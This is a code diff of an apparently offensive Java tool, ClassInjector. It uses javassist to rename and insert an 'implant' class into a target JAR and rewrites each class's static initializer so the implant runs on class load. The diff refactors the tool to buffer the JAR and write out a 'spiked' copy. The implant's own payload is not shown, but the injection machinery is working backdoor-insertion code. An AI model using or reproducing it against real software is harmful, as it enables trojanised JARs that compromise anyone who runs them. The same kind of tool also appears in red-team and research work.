@@ -2,13 +2,10 @@ package org.example.injector;
 
 import javassist.bytecode.*;
 
-import java.io.DataInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.nio.file.Files;
 import java.nio.file.Path;
-import java.nio.file.StandardCopyOption;
 import java.util.jar.JarEntry;
 import java.util.zip.ZipException;
 
@@ -27,27 +24,21 @@ public class ClassInjector {
 
         if (jarLooksSigned(targetJarFilePath)) {
             System.out.println("[-] JAR looks signed. This is not yet implemented. Aborting.");
-            // Just copy the input JAR to the output JAR to keep up with expected behaviour
-            Files.copy(targetJarFilePath, outputJar, StandardCopyOption.REPLACE_EXISTING);
             return false;
         }
 
-        try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
-            for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
+        BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
+        try {
+            for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
-                    entry.forward();
                     continue;
                 }
                 if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
                     System.out.println("[-] Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
-                    entry.forward();
                     continue;
                 }
 
-                ClassFile currentlyProcessing;
-                try (DataInputStream in = new DataInputStream(entry.getContent())) {
-                    currentlyProcessing = new ClassFile(in);
-                }
+                ClassFile currentlyProcessing = readClassFile(entry.getContent());
 
                 String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                 if (implantedClass == null) {
@@ -59,11 +50,10 @@ public class ClassInjector {
                     deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                     JarEntry newJarEntry = convertToJarEntry(implant);
                     try {
-                        implant.write(fiddler.addNewEntry(newJarEntry));
+                        fiddler.addNewEntry(newJarEntry, asByteArray(implant));
                         System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
                     } catch (ZipException e) {
                         System.out.println("[-] Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
-                        entry.forward();
                         continue;   // TODO Signal these different endgames using exceptions instead
                     }
 
@@ -79,11 +69,21 @@ public class ClassInjector {
                  * by an app.
                  */
                 modifyClinit(currentlyProcessing, implantedClass);
-                currentlyProcessing.write(entry.replaceContentByStream());
+                entry.replaceContentWith(asByteArray(currentlyProcessing));
                 System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
             }
 
-            return implantedClass != null;
+            boolean didInfect = implantedClass != null;
+            if (didInfect) {
+                fiddler.write(outputJar);
+                System.out.println("[+] Wrote spiked JAR to " + outputJar);
+            } else {
+                System.out.println("[-] Did not write to any JAR.");
+            }
+
+            return didInfect;
+        } catch (Exception e) {
+            throw new IOException("Something went wrong", e);
         }
     }
 
